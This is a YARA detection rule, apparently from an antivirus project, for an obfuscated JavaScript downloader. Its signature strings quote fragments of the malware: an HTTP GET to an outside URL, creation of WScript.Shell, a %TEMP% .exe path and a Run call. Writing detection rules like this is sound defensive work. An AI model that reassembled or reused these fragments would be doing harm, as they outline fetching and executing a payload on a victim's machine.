rule sig_20160401_f1e5feb38eef2092fa64a19335b30f18 {
  meta:
    description = "datamaliciousorder - file 20160401_f1e5feb38eef2092fa64a19335b30f18.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d5c6fb0bf88d344fbda3f2e28a122f5cd1ed6aa27c13b7c59e45191a44080a20"

  strings:
    $s1  = "OhpRkm[JnkZwu](\"G\" + \"ET\", \"http://ecomputercenter.com/d9sla\", false);" fullword ascii
    $s2  = "var AliTmg = function YxdVt() {return WScript[EsvZt](\"WScript\"+\".Shell\");}(), ZttYr = 11;" fullword ascii
    $s3  = "function ZcbBe(YoKx, ZpsLq){BokOao = BokOao * 1; return YoKx - ZpsLq;};" fullword ascii
    $s4  = "if (OhpRkm[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ChmCl() {return AliTmg[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"hSbZwXD54.ex\" + \"e\";};" fullword ascii
    $s6  = "function LbMn(){return PzhTmh + \"\";};" fullword ascii
    $s7  = "function JhIo() {return ((DkZsk == true) && (DkZsk == MuJj)) ? 1 : BokOao;};" fullword ascii
    $s8  = "function ForVqu()" fullword ascii
    $s9  = "function WdDt(){return 23;};" fullword ascii
    $s10 = "function UiAhs(NuoFmg) {var NwhGy = (1, 2, 3, 4, 5, NuoFmg); return NwhGy;};" fullword ascii
    $s11 = "var DkZsk = false;" fullword ascii
    $s12 = "function ZmJlb(){return EsvZt;};" fullword ascii
    $s13 = "var ZhbOjt = false;" fullword ascii
    $s14 = "var HmIri = new this[\"Date\"]();" fullword ascii
    $s15 = "MuJj = true; " fullword ascii
    $s16 = "DkZsk = true; " fullword ascii
    $s17 = "var MuJj = false;" fullword ascii
    $s18 = "}while (GbbTa);" fullword ascii
    $s19 = "return ZcbBe(YiGt, TbHpt);" fullword ascii
    $s20 = "function SrXqh(XlaBzw){AliTmg[\"R\"+\"un\"](XlaBzw, BokOao, BokOao);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}